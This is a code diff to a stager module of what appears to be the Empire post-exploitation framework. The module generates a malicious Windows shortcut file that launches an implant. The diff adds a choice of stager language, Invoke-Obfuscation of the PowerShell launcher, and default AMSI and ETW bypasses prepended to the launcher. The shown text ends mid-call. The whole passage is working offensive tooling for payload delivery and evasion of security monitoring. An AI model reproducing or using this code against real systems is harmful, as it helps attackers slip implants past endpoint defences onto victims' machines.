@@ -1,8 +1,11 @@
 from __future__ import print_function
 
+import logging
 from builtins import object
 
 from empire.server.common import helpers, pylnk
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
@@ -33,8 +36,13 @@ class Stager(object):
 
         # any options needed by the module, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
+            "Language": {
+                "Description": "Language of the stager to generate.",
+                "Required": True,
+                "Value": "powershell",
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
+                "Strict": True,
+            },
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -87,6 +95,23 @@ class Stager(object):
                 "Required": False,
                 "Value": "default",
             },
+            "Obfuscate": {
+                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Required": False,
+                "Value": "False",
+                "SuggestedValues": ["True", "False"],
+                "Strict": True,
+            },
+            "ObfuscateCommand": {
+                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
+                "Required": False,
+                "Value": r"Token\All\1",
+            },
+            "Bypasses": {
+                "Description": "Bypasses as a space separated list to be prepended to the launcher",
+                "Required": False,
+                "Value": "mattifestation etw",
+            },
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -100,9 +125,7 @@ class Stager(object):
                 self.options[option]["Value"] = value
 
     def generate(self):
-
-        # extract all of our options
-        language = "powershell"
+        language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         base64 = self.options["Base64"]["Value"]
         user_agent = self.options["UserAgent"]["Value"]
@@ -113,25 +136,52 @@ class Stager(object):
         powershell_path = self.options["PowershellPath"]["Value"]
         lnk_name = self.options["OutFile"]["Value"]
         lnk_icon = self.options["Icon"]["Value"]
+        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
+        obfuscate = self.options["Obfuscate"]["Value"]
+
+        invoke_obfuscation = obfuscate.lower() == "true"
 
         encode = False
         if base64.lower() == "true":
             encode = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
-            language=language,
-            encode=encode,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=invoke_obfuscation,
+                obfuscation_command=obfuscate_command,
+                encode=encode,
+                listener_name=listener_name,
+            )
+
+        else:
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=encode,
+                obfuscate=invoke_obfuscation,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+                bypasses=self.options["Bypasses"]["Value"],
+            )
         launcher = launcher.replace("powershell.exe ", "", 1)
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
         else:
             link = pylnk.for_file(
